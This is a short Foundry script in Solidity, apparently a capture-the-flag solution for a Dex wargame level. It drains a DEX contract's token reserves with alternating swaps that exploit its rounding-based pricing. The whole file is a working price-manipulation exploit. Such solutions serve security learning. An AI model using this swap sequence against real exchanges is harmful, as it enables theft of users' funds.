// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level22.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ShopHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        
        Dex dexInstance = Dex(0x4c4213031307bF750E531CF2F3a957cf73dFf9E9);

        address token1 = dexInstance.token1();
        address token2 = dexInstance.token2();

        dexInstance.swap(token1, token2, 10);
        dexInstance.swap(token2, token1, 20);
        dexInstance.swap(token1, token2, 24);
        dexInstance.swap(token2, token1, 30);
        dexInstance.swap(token1, token2, 41);
        dexInstance.swap(token2, token1, 45);


        console.log("Final token1 balance of Dex is : ", dexInstance.balanceOf(token1, address(this)));
        console.log("Final token2 balance of Dex is : ", dexInstance.balanceOf(token2, address(this)));

    }
}